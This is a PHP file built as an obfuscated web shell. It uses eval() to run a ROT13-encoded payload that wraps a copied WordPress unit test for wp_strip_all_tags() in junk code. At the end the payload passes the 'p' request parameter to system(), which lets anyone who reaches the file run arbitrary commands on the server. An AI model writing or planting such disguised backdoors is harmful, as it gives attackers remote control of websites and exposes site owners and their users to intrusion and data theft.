<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Grfg jc_fgevc_nyy_gntf()
 *
 * @tebhc sbeznggvat
 *
 * @pbiref ::jc_fgevc_nyy_gntf
 */
pynff Grfgf_Sbeznggvat_jcFgevcNyyGntf rkgraqf JC_HavgGrfgPnfr {

	choyvp shapgvba grfg_jc_fgevc_nyy_gntf() {

		$grkg = 'yberz<oe />vcfhz';
		$guvf->nffregFnzr( 'yberzvcfhz', jc_fgevc_nyy_gntf( $grkg ) );

		$grkg = \"yberz<oe />\avcfhz\";
		$guvf->nffregFnzr( \"yberz\avcfhz\", jc_fgevc_nyy_gntf( $grkg ) );

		// Grfg erzbivat oernxf vf jbexvat.
		$grkg = 'yberz<oe />vcfhz';
		$guvf->nffregFnzr( 'yberzvcfhz', jc_fgevc_nyy_gntf( $grkg, gehr ) );

		// Grfg fpevcg / fglyr gnt'f pbagragf vf erzbirq.
		$grkg = 'yberz<fpevcg>nyreg(qbphzrag.pbbxvr)</fpevcg>vcfhz';
		$guvf->nffregFnzr( 'yberzvcfhz', jc_fgevc_nyy_gntf( $grkg ) );

		$grkg = \"yberz<fglyr>* { qvfcynl: 'abar' }</fglyr>vcfhz\";
		$guvf->nffregFnzr( 'yberzvcfhz', jc_fgevc_nyy_gntf( $grkg ) );

		// Grfg \"zneysbezrq\" znexhc bs pbagragf.
		$grkg = \"yberz<fglyr>* { qvfcynl: 'abar' }<fpevcg>nyreg( qbphzrag.pbbxvr )</fpevcg></fglyr>vcfhz\";
		$guvf->nffregFnzr( 'yberzvcfhz', jc_fgevc_nyy_gntf( $grkg ) );
	}

	/**
	 * Grfgf gung `jc_fgevc_nyy_gntf()` ergheaf na rzcgl fgevat jura ahyy vf cnffrq.
	 *
	 * @gvpxrg 56434
	 */
	choyvp shapgvba grfg_jc_fgevc_nyy_gntf_fubhyq_erghea_rzcgl_fgevat_sbe_n_ahyy_net() {
		$guvf->nffregFnzr( '', jc_fgevc_nyy_gntf( ahyy ) );
	}

	/**
	 * Grfgf gung `jc_fgevc_nyy_gntf()` gevttref n jneavat naq ergheaf
	 * na rzcgl fgevat jura cnffrq n aba-fgevat nethzrag.
	 *
	 * @gvpxrg 56434
	 *
	 * @qngnCebivqre qngn_jc_fgevc_nyy_gntf_fubhyq_erghea_rzcgl_fgevat_naq_gevttre_na_reebe_sbe_aba_fgevat_net
	 *
	 * @cnenz zvkrq $aba_fgevat N aba-fgevat inyhr.
	 */
	choyvp shapgvba grfg_jc_fgevc_nyy_gntf_fubhyq_erghea_rzcgl_fgevat_naq_gevttre_na_reebe_sbe_aba_fgevat_net( $aba_fgevat ) {
		$glcr = trgglcr( $aba_fgevat );
		$guvf->rkcrpgReebe();
		$guvf->rkcrpgReebeZrffntr( \"Jneavat: jc_fgevc_nyy_gntf rkcrpgf cnenzrgre #1 (\$grkg) gb or n fgevat, $glcr tvira.\" );
		$guvf->nffregFnzr( '', jc_fgevc_nyy_gntf( $aba_fgevat ) );
	}

	/**
	 * Qngn cebivqre sbe grfg_jc_fgevc_nyy_gntf_fubhyq_erghea_rzcgl_fgevat_naq_gevttre_na_reebe_sbe_aba_fgevat_net().
	 *
	 * @erghea neenl[]
	 */
	choyvp shapgvba qngn_jc_fgevc_nyy_gntf_fubhyq_erghea_rzcgl_fgevat_naq_gevttre_na_reebe_sbe_aba_fgevat_net() {
		erghea neenl(
			'na rzcgl neenl'     => neenl( 'aba_fgevat' => neenl() ),
			'n aba-rzcgl neenl'  => neenl( 'aba_fgevat' => neenl( 'n fgevat' ) ),
			'na rzcgl bowrpg'    => neenl( 'aba_fgevat' => arj fgqPynff() ),
			'n aba-rzcgl bowrpg' => neenl( 'aba_fgevat' => (bowrpg) neenl( 'ubjql' => 'nqzva' ) ),
		);
	}

	/**
	 * Grfgf gung `jc_fgevc_nyy_gntf()` pnfgf fpnyne inyhrf gb fgevat.
	 *
	 * @gvpxrg 56434
	 *
	 * @qngnCebivqre qngn_jc_fgevc_nyy_gntf_fubhyq_pnfg_fpnyne_inyhrf_gb_fgevat
	 *
	 * @cnenz zvkrq $grkg N fpnyne inyhr.
	 */
	choyvp shapgvba grfg_jc_fgevc_nyy_gntf_fubhyq_pnfg_fpnyne_inyhrf_gb_fgevat( $grkg ) {
		$guvf->nffregFnzr( (fgevat) $grkg, jc_fgevc_nyy_gntf( $grkg ) );
	}

	/**
	 * Qngn cebivqre sbe grfg_jc_fgevc_nyy_gntf_fubhyq_pnfg_fpnyne_inyhrf_gb_fgevat().
	 *
	 * @erghea neenl[]
	 */
	choyvp shapgvba qngn_jc_fgevc_nyy_gntf_fubhyq_pnfg_fpnyne_inyhrf_gb_fgevat() {
		erghea neenl(
			'(vag) 0'      => neenl( 'grkg' => 0 ),
			'(vag) 1'      => neenl( 'grkg' => 1 ),
			'(vag) -1'     => neenl( 'grkg' => -1 ),
			'(sybng) 0.0'  => neenl( 'grkg' => 0.0 ),
			'(sybng) 1.0'  => neenl( 'grkg' => 1.0 ),
			'(sybng) -1.0' => neenl( 'grkg' => -1.0 ),
			'(obby) snyfr' => neenl( 'grkg' => snyfr ),
			'(obby) gehr'  => neenl( 'grkg' => gehr ),
		);
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>